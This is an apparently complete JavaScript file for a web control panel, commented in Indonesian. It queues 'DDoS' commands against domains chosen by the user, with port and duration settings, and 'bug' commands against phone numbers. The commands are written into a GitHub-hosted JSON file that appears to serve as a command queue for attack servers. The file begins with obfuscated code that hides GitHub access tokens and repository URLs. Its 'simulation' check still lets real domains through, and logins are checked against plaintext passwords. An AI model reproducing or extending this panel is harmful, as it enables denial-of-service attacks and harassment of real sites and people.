(function(_0x164146,_0x4b7ada){function _0x36a89b(_0x13269d,_0xc630c3,_0x103746,_0x762b00){return _0x4ce6(_0x13269d- -0x2f0,_0xc630c3);}function _0x59932c(_0x1d6e9e,_0x97be62,_0x50ed1c,_0x14c470){return _0x4ce6(_0x97be62-0xa4,_0x14c470);}const _0x6298ec=_0x164146();while(!![]){try{const _0x56fbd8=parseInt(_0x36a89b(-0x1f2,-0x207,-0x20d,-0x1ce))/(-0x5*0x504+0x1ac9+-0x4*0x6d)+parseInt(_0x59932c(0x18a,0x188,0x16e,0x188))/(-0xe1f+0x1*0x19b2+0x3*-0x3db)+parseInt(_0x36a89b(-0x1ec,-0x1fb,-0x1e7,-0x201))/(0x1e09+0x14d8+-0x32de)+parseInt(_0x36a89b(-0x1d3,-0x1e0,-0x1ee,-0x1ae))/(-0x1878+-0x163f*0x1+0x2ebb)+parseInt(_0x59932c(0x172,0x18f,0x1a7,0x171))/(0x1dc2+-0x1*-0x248d+-0x424a)+parseInt(_0x59932c(0x1a9,0x1be,0x1a6,0x1b3))/(-0x1bdf+0x5d2+0x1613)*(-parseInt(_0x36a89b(-0x1f0,-0x1d4,-0x1f3,-0x1dd))/(0x1*-0x1ebd+0x131c+-0x4*-0x2ea))+-parseInt(_0x36a89b(-0x1f6,-0x21a,-0x20e,-0x1ee))/(0x217d+-0x171b+0x109*-0xa);if(_0x56fbd8===_0x4b7ada)break;else _0x6298ec['push'](_0x6298ec['shift']());}catch(_0x5d96d9){_0x6298ec['push'](_0x6298ec['shift']());}}}(_0x57f6,-0x93*0x543+-0x3c5a1+0x1*0xa37d3));const _0x5b2d40=(function(){const _0x945a6={'vfcca':function(_0x4e9ee7,_0x45cea3){return _0x4e9ee7+_0x45cea3;},'iDGBu':function(_0x5cd73d){return _0x5cd73d();},'yBEry':function(_0x3aeb9a,_0x20e059){return _0x3aeb9a!==_0x20e059;},'aqayE':'fXqXw'};let _0x32dc20=!![];return function(_0x3a2ac,_0x123f3f){const _0x4542b2={'lnKTQ':function(_0x1babfd,_0x57dc0e){function _0x150e03(_0x48991b,_0xfd322a,_0x30d800,_0x44f18e){return _0x4ce6(_0xfd322a- -0x22e,_0x48991b);}return _0x945a6[_0x150e03(-0x13a,-0x156,-0x17d,-0x173)](_0x1babfd,_0x57dc0e);},'DwQNP':function(_0x2e8931){function _0x240ba2(_0x5dce24,_0xffc7dd,_0x2ebc11,_0x363e13){return _0x4ce6(_0x5dce24- -0x386,_0x2ebc11);}return _0x945a6[_0x240ba2(-0x2af,-0x2aa,-0x2ba,-0x2b5)](_0x2e8931);},'LibVj':function(_0x2288d8,_0x4f6d05){function _0x1504c7(_0x1a9822,_0x32c9dd,_0x39a443,_0x32c548){return _0x4ce6(_0x1a9822- -0x1ac,_0x39a443);}return _0x945a6[_0x1504c7(-0x9c,-0x7a,-0xb0,-0x96)](_0x2288d8,_0x4f6d05);},'qGdBH':_0x945a6['aqayE'],'NfbJC':_0x4b2847(0x335,0x31d,0x332,0x325)},_0x3e3705=_0x32dc20?function(){function _0x36160b(_0x22f783,_0x1cc663,_0x461c1b,_0x25300f){return _0x4b2847(_0x22f783-0x8d,_0x22f783,_0x461c1b-0x13d,_0x461c1b-0x24);}function _0x20a5b3(_0x13cef9,_0x31ec67,_0x484d57,_0x237be6){return _0x4b2847(_0x13cef9-0xd0,_0x484d57,_0x484d57-0xed,_0x13cef9- -0x34f);}const _0x32612b={'xUCPy':function(_0x5af771,_0xaf3cd0){function _0xa93864(_0xf9429e,_0x188bee,_0x5c21e5,_0x9d8d1f){return _0x4ce6(_0x188bee- -0x1c6,_0x9d8d1f);}return _0x4542b2[_0xa93864(-0xd5,-0xdc,-0xef,-0xe3)](_0x5af771,_0xaf3cd0);},'JlWmm':function(_0x19df00){function _0x2887d7(_0x5a4a87,_0xb60a1a,_0x119a25,_0x13bb76){return _0x4ce6(_0x119a25- -0x21a,_0xb60a1a);}return _0x4542b2[_0x2887d7(-0x110,-0x13c,-0x135,-0x114)](_0x19df00);}};if(_0x4542b2[_0x36160b(0x328,0x325,0x330,0x313)](_0x4542b2[_0x20a5b3(-0x56,-0x49,-0x50,-0x5c)],_0x4542b2[_0x20a5b3(-0x5a,-0x37,-0x46,-0x65)])){if(_0x123f3f){const _0x2f1c8d=_0x123f3f['apply'](_0x3a2ac,arguments);return _0x123f3f=null,_0x2f1c8d;}}else{const _0x1ca01b=_0x24f004(_0x32612b[_0x36160b(0x32c,0x336,0x342,0x35e)](_0x20a5b3(-0x6c,-0x8b,-0x6c,-0x4c)+_0x36160b(0x337,0x329,0x312,0x316)+(_0x20a5b3(-0x25,-0x3b,-0x13,-0x30)+_0x20a5b3(-0x2f,-0x22,-0x36,-0x10)+_0x36160b(0x342,0x2fc,0x321,0x312)+'\x20)'),');'));_0x3cc478=_0x32612b[_0x36160b(0x329,0x2ff,0x322,0x312)](_0x1ca01b);}}:function(){};function _0x4b2847(_0x3ce6af,_0x390289,_0x11239d,_0x25fe56){return _0x4ce6(_0x25fe56-0x202,_0x390289);}return _0x32dc20=![],_0x3e3705;};}());function _0x57f6(){const _0x4f3ca2=['DwQNP','DvaeU','9fgtGRK3XM','CTIVITY/co','dbweb.json','lnKTQ','1234890JoEKsh','nction()\x20','(((.+)+)+)','oMEK0u52XP','affaDevv/A','om/repos/R','_11BXTLBFA','ntents/act','NfbJC','toString','apply','wg7jkjyrhT','qGdBH','mxoSl','0LQ2Zf1N8l','6413952VIOvDr','rn\x20this\x22)(','JlWmm','i.github.c','354489LhbdWB','EYA7MS6e92','21IJuXPQ','_11BTRJTMA','exception','elrmX','839862wgeXfO','trace','Lv1','prototype','avageStore','log','LibVj','/contents/','lhDEu','warn','error','Od2Sp8kAGB','yBEry','kLT','LdqjM','bind','om/repos/D','xII_QFKhnU','https://ap','3OOPHigORF','table','jHDTW','472686SciTNH','length','xUCPy','814848QeKdHE','ctor(\x22retu','qfx','d/contents','github_pat','K2W_jUCXYc','MsRLK','tXFO1cyAbb','NrBZo','6WXP3RM1I4','info','{}.constru','iDGBu','vfcca','constructo','JaKLh','DvtwT','6piEE4nMkX','/dbkapotid','HAR_Os0zD8','search','console','return\x20(fu','CoETjEup79','__proto__','354790JjocNg'];_0x57f6=function(){return _0x4f3ca2;};return _0x57f6();}function _0x181b4a(_0x49a16a,_0x42cb3d,_0x2a7289,_0x11d0b9){return _0x4ce6(_0x11d0b9- -0x187,_0x42cb3d);}const _0x2180fd=_0x5b2d40(this,function(){function _0x336e20(_0x3dd61c,_0x5cdd5c,_0x408f87,_0x3c3cf5){return _0x4ce6(_0x3dd61c-0x101,_0x5cdd5c);}function _0x284b39(_0x59f2b5,_0x4d6d6c,_0x2eaca7,_0x2710e9){return _0x4ce6(_0x4d6d6c-0x2fa,_0x2710e9);}const _0x142ecc={};_0x142ecc[_0x284b39(0x3ec,0x3fd,0x40b,0x3fa)]=_0x336e20(0x1ee,0x217,0x1eb,0x1fd)+'+$';const _0x2d262c=_0x142ecc;return _0x2180fd[_0x284b39(0x3ca,0x3ee,0x3c6,0x417)]()[_0x284b39(0x3ff,0x3d9,0x3f1,0x3de)](_0x2d262c[_0x336e20(0x204,0x200,0x203,0x216)])['toString']()[_0x336e20(0x1da,0x1b3,0x1f5,0x1bf)+'r'](_0x2180fd)[_0x336e20(0x1e0,0x1ef,0x1ee,0x207)](_0x2d262c[_0x336e20(0x204,0x21b,0x1fd,0x207)]);});_0x2180fd();const _0x2deddb=(function(){const _0x4e293c={};_0x4e293c['lhDEu']=_0xbf3fb2(-0x243,-0x23d,-0x267,-0x235)+'+$',_0x4e293c[_0xbf3fb2(-0x238,-0x22f,-0x229,-0x252)]=_0x19b802(-0x225,-0x23f,-0x21f,-0x23a);const _0x2c1564=_0x4e293c;function _0xbf3fb2(_0x229430,_0x2f1aff,_0x508a3c,_0x284c0c){return _0x4ce6(_0x229430- -0x330,_0x508a3c);}function _0x19b802(_0x8b18b7,_0x21548e,_0x1ef70f,_0x5a3ba3){return _0x4ce6(_0x1ef70f- -0x338,_0x5a3ba3);}let _0x274622=!![];return function(_0x3089c2,_0x19c3f7){function _0xa96d0d(_0x6e4d4d,_0xcaf028,_0x1dadf0,_0x769427){return _0xbf3fb2(_0x6e4d4d-0x678,_0xcaf028-0x61,_0x769427,_0x769427-0x1ed);}function _0x50f920(_0x48876b,_0x34659a,_0x1e08a4,_0x4fad07){return _0x19b802(_0x48876b-0x181,_0x34659a-0x1cf,_0x48876b-0x6e8,_0x34659a);}if(_0x50f920(0x48a,0x496,0x4a3,0x49b)===_0x2c1564[_0x50f920(0x4a8,0x48f,0x4b3,0x4c9)])return _0x50433c[_0xa96d0d(0x43c,0x423,0x45d,0x42d)]()[_0xa96d0d(0x427,0x40b,0x40f,0x44b)](_0x2c1564[_0x50f920(0x4bc,0x4db,0x4e5,0x4c9)])[_0x50f920(0x4a4,0x4a7,0x48b,0x4a8)]()['constructo'+'r'](_0x187cdf)[_0xa96d0d(0x427,0x439,0x404,0x44e)](_0xa96d0d(0x435,0x45b,0x45b,0x455)+'+$');else{const _0x31e68e=_0x274622?function(){function _0xff0deb(_0x237a3c,_0x45a1cc,_0x261ad9,_0x33fcff){return _0xa96d0d(_0x33fcff- -0x6bd,_0x45a1cc-0x1c2,_0x261ad9-0x2e,_0x237a3c);}if(_0x19c3f7){const _0x5e6dbf=_0x19c3f7[_0xff0deb(-0x27f,-0x277,-0x27e,-0x280)](_0x3089c2,arguments);return _0x19c3f7=null,_0x5e6dbf;}}:function(){};return _0x274622=![],_0x31e68e;}};}());function _0x25ac3e(_0x58c1f7,_0x51b659,_0x5dae73,_0x201a25){return _0x4ce6(_0x58c1f7- -0x26a,_0x51b659);}const _0x516662=_0x2deddb(this,function(){const _0x16be33={'EQOwc':function(_0x2d0f51,_0x270fd9){return _0x2d0f51(_0x270fd9);},'DvaeU':function(_0x28fe61,_0x14ae51){return _0x28fe61+_0x14ae51;},'NrBZo':function(_0xe9fda9){return _0xe9fda9();},'LdqjM':_0x26df4b(0x147,0x130,0x147,0x128),'DvtwT':_0x26df4b(0x12b,0x13f,0x166,0x159),'xeoaA':_0x26df4b(0x10d,0x12c,0x123,0x10b),'danQG':function(_0x3fe7f7,_0x438958){return _0x3fe7f7<_0x438958;}};function _0x3395d1(_0x1de338,_0x1f4280,_0xb93c64,_0x2249ee){return _0x4ce6(_0x2249ee- -0x18b,_0x1de338);}let _0x39717b;try{const _0x5826fe=_0x16be33['EQOwc'](Function,_0x16be33[_0x3395d1(-0xa7,-0xa2,-0xbc,-0xa5)](_0x3395d1(-0xcd,-0xac,-0xa9,-0xaa)+_0x3395d1(-0xc5,-0xbf,-0xb0,-0x9f)+(_0x3395d1(-0x75,-0x4f,-0x44,-0x63)+_0x26df4b(0x134,0x145,0x16b,0x14f)+_0x3395d1(-0x71,-0xb0,-0xb3,-0x90)+'\x20)'),');'));_0x39717b=_0x16be33[_0x26df4b(0x142,0x14c,0x15c,0x134)](_0x5826fe);}catch(_0x41ba36){_0x39717b=window;}const _0x215455=_0x39717b[_0x26df4b(0xfc,0x107,0x116,0x115)]=_0x39717b['console']||{},_0x1164b2=[_0x16be33[_0x3395d1(-0x54,-0x67,-0x84,-0x79)],_0x3395d1(-0x70,-0x6a,-0x96,-0x7e),_0x3395d1(-0x6e,-0x6d,-0x53,-0x64),_0x3395d1(-0x7f,-0x7f,-0x5b,-0x7d),_0x26df4b(0x11e,0x129,0x112,0x152),_0x16be33[_0x26df4b(0x117,0x102,0x105,0x107)],_0x16be33['xeoaA']];function _0x26df4b(_0x46de06,_0x319ca9,_0x4252c8,_0x139059){return _0x4ce6(_0x319ca9-0x27,_0x4252c8);}for(let _0x293acf=0x11f9+-0xa16+-0x7e3;_0x16be33['danQG'](_0x293acf,_0x1164b2[_0x3395d1(-0x96,-0x83,-0x67,-0x70)]);_0x293acf++){const _0x2b4d71=_0x2deddb[_0x26df4b(0xef,0x100,0x128,0x108)+'r'][_0x26df4b(0x156,0x12e,0x13e,0x112)][_0x3395d1(-0x58,-0x97,-0x98,-0x78)](_0x2deddb),_0xc78844=_0x1164b2[_0x293acf],_0x1d61e8=_0x215455[_0xc78844]||_0x2b4d71;_0x2b4d71[_0x3395d1(-0x89,-0xac,-0xa1,-0xa8)]=_0x2deddb[_0x26df4b(0x151,0x13a,0x158,0x128)](_0x2deddb),_0x2b4d71[_0x26df4b(0x102,0x11b,0x11a,0x13a)]=_0x1d61e8['toString']['bind'](_0x1d61e8),_0x215455[_0xc78844]=_0x2b4d71;}});function _0x4ce6(_0x576be2,_0x2180fd){const _0x5b2d40=_0x57f6();return _0x4ce6=function(_0x57f63f,_0x4ce679){_0x57f63f=_0x57f63f-(-0xb5f+-0x1*0x376+0xfac);let _0x35469c=_0x5b2d40[_0x57f63f];return _0x35469c;},_0x4ce6(_0x576be2,_0x2180fd);}_0x516662();const API_LOGIN=_0x25ac3e(-0x154,-0x12f,-0x12b,-0x167)+_0x181b4a(-0xa2,-0x97,-0xa5,-0x8a)+_0x25ac3e(-0x17a,-0x177,-0x17e,-0x18c)+_0x25ac3e(-0x162,-0x152,-0x166,-0x159)+_0x25ac3e(-0x18d,-0x168,-0x172,-0x195)+_0x181b4a(-0x73,-0x97,-0x6a,-0x7c)+_0x181b4a(-0x8e,-0x8d,-0xa8,-0x9e),TOKEN_LOGIN=_0x25ac3e(-0x149,-0x158,-0x12d,-0x163)+_0x25ac3e(-0x179,-0x196,-0x198,-0x16e)+'0VwKHaIpXK'+_0x25ac3e(-0x155,-0x16e,-0x133,-0x13a)+'vJ4gkYSFoG'+_0x181b4a(-0x69,-0xb7,-0xab,-0x91)+_0x25ac3e(-0x18e,-0x165,-0x19f,-0x1a0)+_0x25ac3e(-0x15b,-0x14c,-0x13d,-0x158)+'2AL7LAMeaW'+_0x25ac3e(-0x164,-0x189,-0x189,-0x179),API_BUGS='https://ap'+_0x181b4a(-0x80,-0x7f,-0xa5,-0x8a)+'om/repos/R'+'avageStore'+'/bugkapoti'+_0x25ac3e(-0x14a,-0x136,-0x165,-0x16a)+'/sender.js'+'on',TOKEN_BUGS='github_pat'+_0x25ac3e(-0x179,-0x199,-0x15e,-0x153)+_0x181b4a(-0xb5,-0x97,-0x92,-0x8e)+_0x181b4a(-0xc2,-0xc8,-0xbb,-0xa9)+'Fozgq6oEhN'+'AAxp2qf0Oh'+_0x25ac3e(-0x146,-0x134,-0x161,-0x127)+_0x181b4a(-0xbf,-0x8a,-0x74,-0x99)+_0x25ac3e(-0x144,-0x141,-0x16a,-0x13d)+_0x25ac3e(-0x14b,-0x161,-0x13f,-0x157),API_ACTIVITY=_0x181b4a(-0x9a,-0x65,-0x57,-0x71)+_0x181b4a(-0x72,-0x77,-0x87,-0x8a)+_0x25ac3e(-0x156,-0x16a,-0x16c,-0x16a)+_0x25ac3e(-0x17b,-0x188,-0x186,-0x161)+_0x181b4a(-0xb2,-0x7f,-0x79,-0x9f)+_0x181b4a(-0xb7,-0x76,-0x6d,-0x95)+'ivity.json',TOKEN_ACTIVITY=_0x25ac3e(-0x149,-0x123,-0x164,-0x127)+_0x181b4a(-0x78,-0x76,-0x75,-0x86)+'0Q7N7Q9JJN'+_0x181b4a(-0x4d,-0x47,-0x4a,-0x65)+'WmbfJGJi75'+_0x25ac3e(-0x153,-0x15a,-0x137,-0x12d)+_0x25ac3e(-0x188,-0x1a7,-0x1a7,-0x189)+_0x25ac3e(-0x183,-0x164,-0x1a9,-0x18c)+_0x181b4a(-0xa2,-0x6d,-0xa2,-0x88)+_0x181b4a(-0x5d,-0x74,-0x82,-0x76);

  	// Custom Dropdown Role
const roleBtn = document.getElementById("roleBtn");
const roleList = document.getElementById("roleList");
const newRole = document.getElementById("newRole");

roleBtn.onclick = () => roleList.classList.toggle("hidden");

roleList.querySelectorAll("li").forEach(li => {
  li.onclick = () => {
    roleBtn.innerHTML = `<span style="display:flex;align-items:center;gap:8px;justify-content:center;width:100%">${li.innerHTML}</span> â–¾`;
    newRole.value = li.dataset.value;
    roleList.classList.add("hidden");
  };
});



function ddos_isSimTarget(target){
  if(!target) return false;
  const t = target.trim();

  // disallow if contains protocol or spaces
  if(/\s/.test(t)) return false;
  if(/^(https?:\/\/)/i.test(t)) return false;

  // disallow IPv4/IPv6 raw addresses
  const isIPv4 = /^(\d{1,3}\.){3}\d{1,3}$/.test(t);
  const isIPv6 = /:/.test(t) && /^[0-9a-fA-F:]+$/.test(t);
  if(isIPv4 || isIPv6) return false;

  // allow domain-like strings (contains at least one dot and alpha chars)
  if(/^[a-z0-9\-]+\.[a-z0-9\-\.]+$/i.test(t)) return true;

  // allow SIM: or sim- prefixed tokens for explicit simulation
  if(/^SIM:|^sim-/i.test(t)) return true;

  // otherwise disallow
  return false;
}

/* write minimal-format entry to idch.json:
   { command: "...", status: "pending" } */
async function ddos_sendCommandToGithub(command, target) {
  if(!ddos_isSimTarget(target)) throw new Error('Target tidak valid â€” gunakan nama domain (example.com) atau prefix SIM: untuk simulasi.');

  if(typeof githubGet !== 'function' || typeof githubPut !== 'function'){
    throw new Error('Helper githubGet/githubPut tidak ditemukan di halaman.');
  }

  // fetch current idch.json
  const { content: oldContent, sha } = await githubGet(API_BUGS, TOKEN_BUGS);
  const base = (oldContent && oldContent.data) ? oldContent : { server: "Active", data: [] };

  // minimal entry format required
  const entry = {
    command: command,
    status: "pending"
  };

  base.data.push(entry);

  // commit back to GitHub
  await githubPut(API_BUGS, TOKEN_BUGS, base, `log: ${command}`, sha);
  return entry;
}

/* increment activity count and sync UI */
async function ddos_incrementActivity(delta = 1){
  if(typeof githubGet !== 'function' || typeof githubPut !== 'function'){
    console.warn('github helpers not found for activity increment');
    return null;
  }
  const res = await githubGet(API_ACTIVITY, TOKEN_ACTIVITY);
  const data = res.content || { Activitas: 0 };
  data.Activitas = (parseInt(data.Activitas, 10) || 0) + delta;
  await githubPut(API_ACTIVITY, TOKEN_ACTIVITY, data, `activity +${delta}`, res.sha);

  // update UI elements if present
  const el = document.getElementById('ddosActivityCount');
  if(el) el.textContent = data.Activitas;
  const globalEl = document.getElementById('activityCount');
  if(globalEl) globalEl.textContent = data.Activitas;

  return data.Activitas;
}

/* UI wiring */
(function(){
  const cards = document.querySelectorAll('#ddosMethodGrid .ddos-card');
  let chosenCmd = null;
  cards.forEach(c => {
    c.addEventListener('click', () => {
      cards.forEach(x => x.classList.remove('selected'));
      c.classList.add('selected');
      chosenCmd = c.dataset.cmd; // e.g. ".slow"
    });
  });

  const btn = document.getElementById('sendDdosBtn');
  const msgEl = document.getElementById('ddosMsg');
  const targetInput = document.getElementById('ddosTargetInput');
  const portInput = document.getElementById('ddosPortInput');
  const durInput = document.getElementById('ddosDurationInput');
  const serverEl = document.getElementById('ddosServerStatus');

  btn.addEventListener('click', async () => {
    try {
      if(!chosenCmd) throw new Error('Pilih type DDoS dulu.');
      const rawTarget = (targetInput.value || '').trim();
      if(!rawTarget) throw new Error('Isi target.');

      // sanitize dur & port to digits only; use 'auto' if empty
      const durRaw = (durInput.value || '').trim();
      const portRaw = (portInput.value || '').trim();
      const dur = durRaw === '' ? 'auto' : (durRaw.replace(/\D/g,'') || 'auto');
      const port = portRaw === '' ? 'auto' : (portRaw.replace(/\D/g,'') || 'auto');

      // build command with colons exactly as requested
      const cmd = `${chosenCmd} ${rawTarget} dur:${dur} port:${port}`;
      
      // setelah: const cmd = `${chosenCmd} ${rawTarget} dur:${dur} port:${port}`;

// buat string link untuk tampil di pesan (tambahkan http:// jika belum ada)
const link = /^(https?:\/\/)/i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;


      // send minimal-format entry to idch.json
      await ddos_sendCommandToGithub(cmd, rawTarget);

      // increment activity count
      await ddos_incrementActivity(1);

      // visual feedback
      if(serverEl) serverEl.textContent = 'ON';
      msgEl.textContent = `Berhasil Dikirim ke "${link}"`;
      msgEl.style.color = 'var(--success)';
if (typeof showPopupNotif === 'function') {
  showPopupNotif(`Succes!\n${link}`, true);
}

      // brief server ON flash
      setTimeout(()=>{ if(serverEl) serverEl.textContent = 'OFF'; }, 2000);

    } catch(err) {
      msgEl.textContent = err.message || 'Gagal mengirim command.';
      msgEl.style.color = 'var(--danger)';
      if(typeof showPopupNotif === 'function') showPopupNotif(err.message || 'Gagal', false);
    }
  });
})();

async function loadActivity() {
  try {
    const res = await fetch(API_ACTIVITY, {
      headers: { Authorization: `token ${TOKEN_ACTIVITY}` }
    });
    const data = await res.json();
    const content = atob(data.content);
    const actData = JSON.parse(content);
    document.getElementById('activityCount').textContent = actData.Activitas || 0;
  } catch (err) {
    console.error("Gagal load activity:", err);
  }
}

async function loadServer() {
  try {
    const res = await fetch(API_SERVER, {
      headers: { Authorization: `token ${TOKEN_ACTIVITY}` }
    });
    const data = await res.json();
    const content = atob(data.content);
    const srvData = JSON.parse(content);
    document.getElementById('serverStatus').textContent =
      srvData.Servers?.Active ? "ON" : "OFF";
  } catch (err) {
    console.error("Gagal load server:", err);
  }
}

// panggil otomatis saat masuk ke view-bug
document.addEventListener("DOMContentLoaded", () => {
  loadActivity();
  loadServer();
});

// ===== CONFIG BUG =====


let selectedBug = null;

// Pilih bug type
document.querySelectorAll('.bug-card').forEach(card=>{
  card.addEventListener('click', ()=>{
    document.querySelectorAll('.bug-card').forEach(c=> c.classList.remove('selected'));
    card.classList.add('selected');
    selectedBug = card.dataset.cmd;
  });
});

// Tombol Send Bug
document.getElementById('sendBugBtn').addEventListener('click', async()=>{
  const num = document.getElementById('bugNumber').value.trim();
  const msg = document.getElementById('bugMsg');

  if(!num){ msg.textContent="Nomor wajib diisi!"; msg.style.color="var(--danger)"; return; }
  if(!selectedBug){ msg.textContent="Pilih type bug terlebih dahulu!"; msg.style.color="var(--danger)"; return; }

  const command = `${selectedBug} ${num}`;

  try {
    // Ambil isi JSON lama (idch.json)
    const {content, sha} = await githubGet(API_BUGS, TOKEN_BUGS);
    let bugs = content || { server: "Active", data: [] };

    // Tambahkan entry baru ke data[]
    bugs.data.push({
      command: command,
      status: "pending"
    });

    // Update ke GitHub (idch.json)
    await githubPut(API_BUGS, TOKEN_BUGS, bugs, `send bug ${command}`, sha);

    // ðŸ”¥ Update activity.json biar naik jumlahnya
    const act = await githubGet(API_ACTIVITY, TOKEN_ACTIVITY);
    let actData = act.content || { Activitas: 0 };
    actData.Activitas = (parseInt(actData.Activitas) || 0) + 1;
    await githubPut(API_ACTIVITY, TOKEN_ACTIVITY, actData, "update activity", act.sha);

    // âœ… Refresh tampilan activity
    loadActivity();

    // âœ… Notif sukses + animasi
    showPopupNotif(`Bug berhasil dikirim ke ${num}`);

  } catch(err){
    msg.textContent = "Gagal kirim bug: " + err.message;
    msg.style.color = "var(--danger)";
  }
});

    // ====== CONFIG (Dari Anda) ======


    // ====== STATE ======
    let state = {
      user:null, role:null,
      loginSha:null, loginList:[],
      numbersSha:null, numbers:[],
    }

    // ====== UTIL ======
    async function githubGet(url, token){
      const res = await fetch(url, {headers:{Authorization:`token ${token}`, Accept:'application/vnd.github+json'}});
      if(res.status === 404){
        return {content:null, sha:null, notFound:true}
      }
      if(!res.ok){ throw new Error('GitHub GET failed: '+res.status) }
      const data = await res.json();
      const decoded = data.content ? JSON.parse(atob(data.content)) : null;
      return {content:decoded, sha:data.sha}
    }

    async function githubPut(url, token, jsonContent, message, sha){
      const body = {
        message,
        content: btoa(JSON.stringify(jsonContent, null, 2)),
        sha: sha || undefined
      }
      const res = await fetch(url, {
        method:'PUT',
        headers:{'Content-Type':'application/json', Authorization:`token ${token}`, Accept:'application/vnd.github+json'},
        body: JSON.stringify(body)
      });
      if(!res.ok){
        const t = await res.text();
        throw new Error('GitHub PUT failed: '+res.status+' '+t)
      }
      return await res.json();
    }

    function toast(el, msg, ok=true){ el.textContent = msg; el.style.color = ok? 'var(--success)':'var(--danger)'; }

    function setView(id){
  // sembunyikan semua view
  document.querySelectorAll('main[id^="view-"]').forEach(m => {
    m.classList.add('hidden');
    m.classList.remove('visible'); // reset animasi
  });

  // tampilkan target
  const target = document.getElementById('view-'+id);
  if(target){
    target.classList.remove('hidden');
    // delay supaya browser reset style â†’ animasi muncul lagi
    setTimeout(()=> target.classList.add('visible'), 50);
  }

  // update menu drawer
  document.querySelectorAll('.menu a').forEach(a => a.classList.remove('active'));
  const link = document.querySelector(`.menu a[data-view="${id}"]`);
  if(link) link.classList.add('active');

  drawer.classList.remove('open');
  window.scrollTo({top:0, behavior:'smooth'});
}

function showBugSuccess(msg) {
  const bugMsg = document.getElementById("bugMsg");
  bugMsg.textContent = msg;
  bugMsg.style.color = "lime";

  // âœ… Tambahkan animasi ke card Bug
  const bugCard = bugMsg.closest(".card");
  bugCard.classList.remove("success-anim"); // reset dulu kalau ada
  void bugCard.offsetWidth;                 // trigger reflow biar animasi bisa ulang
  bugCard.classList.add("success-anim");
}
    
    function parseExpired(input){
  const now = new Date();
  if(!input) return null;

  const trimmed = input.trim().toLowerCase();

  // kalau cuma angka â†’ default = hari
  if(/^\d+$/.test(trimmed)){
    now.setDate(now.getDate() + parseInt(trimmed));
    return now.toISOString();
  }

  const m = trimmed.match(/(\d+)\s*(hari|jam|h|j)/i);
  if(!m) return null;

  const val = parseInt(m[1]);
  const unit = m[2];

  if(unit.startsWith('h')) now.setDate(now.getDate() + val);   // hari/h
  else if(unit.startsWith('j')) now.setHours(now.getHours() + val); // jam/j

  return now.toISOString();
}

    // ====== LOGIN FLOW ======
    async function loadLogins(){
  const {content, sha} = await githubGet(API_LOGIN, TOKEN_LOGIN);

  if(Array.isArray(content)){
    state.loginList = content;
  } else if(content && typeof content === "object"){
    // kalau object tunggal, bungkus jadi array
    state.loginList = [content];
  } else {
    state.loginList = [];
  }

  state.loginSha = sha;
}

async function deleteAccount(username){
  try {
    // filter akun yang bukan username ini
    state.loginList = state.loginList.filter(acc => acc.username !== username);

    // simpan ke GitHub
    await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `delete user ${username}`, state.loginSha);

    // reload list & render ulang
    await loadLogins();
    renderAccounts();

    toast(accMsg, `Akun "${username}" berhasil dihapus`, true);
  } catch(e){
    toast(accMsg, `Gagal hapus akun`, false);
  }
}

    async function doLogin(username, password){
  await loadLogins();
  const found = state.loginList.find(u => u.username === username && u.password === password);
  if(!found) return null;

  if(found.expired){
    const expDate = new Date(found.expired).getTime();
    if(Date.now() > expDate){
      // hapus akun expired
      state.loginList = state.loginList.filter(x=>x.username !== username);
      await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `delete expired user ${username}`, state.loginSha);
      throw new Error("Akun sudah kedaluwarsa dan dihapus");
    }
  }

  state.user = username; 
  state.role = found.role;
  localStorage.setItem('session', JSON.stringify({u:username, r:found.role}));
  return found;
}

    function restoreSession(){
  const s = localStorage.getItem('session');
  if(!s){
    setView('login'); // kalau belum login â†’ tampilkan login
    return;
  }

  const {u, r} = JSON.parse(s);
  state.user = u; 
  state.role = r;

  document.getElementById('who').textContent = u + ' â€¢ ' + r;
  document.getElementById('userBadge').classList.remove('hidden');
  document.getElementById('roleChip').textContent = r;
  if(r==='admin') document.getElementById('adminSection').classList.remove('hidden');
  document.getElementById('btnHamburger').classList.remove('hidden');
  document.getElementById('btnProfile').classList.remove('hidden');

    // ðŸ”¥ panggil nav biar muncul
    showBottomNav();

  showBottomNav(); 
  setView('dashboard');
        startNotifCycle();
  loadNumbers();
}

    function logout(){
      localStorage.removeItem('session'); location.reload();
    }

   // ----- Bottom nav helpers -----
function setActiveBottomNav(view){
  const items = document.querySelectorAll('#bottomNav a[data-view]');
  items.forEach(a => {
    if(a.dataset.view === view) a.classList.add('active');
    else a.classList.remove('active');
  });
}

function showBottomNav(){
  const bottomNav = document.getElementById('bottomNav');
  if(!bottomNav) return;

  bottomNav.classList.remove('hidden');
  void bottomNav.offsetWidth;
  bottomNav.classList.add('show');
  setActiveBottomNav('dashboard');

  // Tambahkan event listener click setelah nav tampil
  bottomNav.querySelectorAll('a[data-view]').forEach(a=>{
    a.onclick = (e)=>{
      e.preventDefault();
      const v = a.dataset.view;
      setView(v);
      setActiveBottomNav(v);

      if(v==='numbers'){ loadNumbers(); }
      if(v==='accounts'){ 
  if(state.role === 'admin'){
    loadLogins(); 
    renderAccounts(); 
  } else {
    setView('accounts-blocked');
  }
}
    };
  });
}

let slideIndex = 0;
let slidesBox;

function showSlidesBox() {
  slidesBox.forEach((el) => el.classList.remove("active", "prev"));

  const prevIndex = slideIndex;
  slideIndex = (slideIndex + 1) % slidesBox.length;

  slidesBox[prevIndex].classList.add("prev");
  slidesBox[slideIndex].classList.add("active");

  setTimeout(showSlidesBox, 2000); // ganti tiap 4 detik
}

document.addEventListener("DOMContentLoaded", () => {
  slidesBox = document.querySelectorAll(".slideshow-box .slide-box");
  if (slidesBox.length > 0) {
    slidesBox[0].classList.add("active");
    setTimeout(showSlidesBox, 4000);
  }
});

// click handlers: show text on active, change view
document.querySelectorAll('#bottomNav a[data-view]').forEach(a=>{
  a.addEventListener('click', e=>{
    e.preventDefault();
    const v = a.dataset.view;
    setView(v);
    setActiveBottomNav(v);
  });
});

// Optional: when setView() is called elsewhere, also sync bottom nav
// If you want ensure sync, modify setView to call setActiveBottomNav(id) at the end.
const _origSetView = setView;
setView = function(id){
  _origSetView(id);
  // sync bottom nav if visible
  const bn = document.getElementById('bottomNav');
  if(bn && bn.classList.contains('show')) setActiveBottomNav(id);
}

    // ====== ACCOUNTS (ADMIN) ======
    function renderAccounts(){
  const body = document.getElementById('accountsTable');
  body.innerHTML = '';

  state.loginList.forEach((acc, i) => {
    let expiredText = "Tidak ada";

    if(acc.expired){
      const expDate = new Date(acc.expired).getTime();
      const now = Date.now();
      const diff = expDate - now;
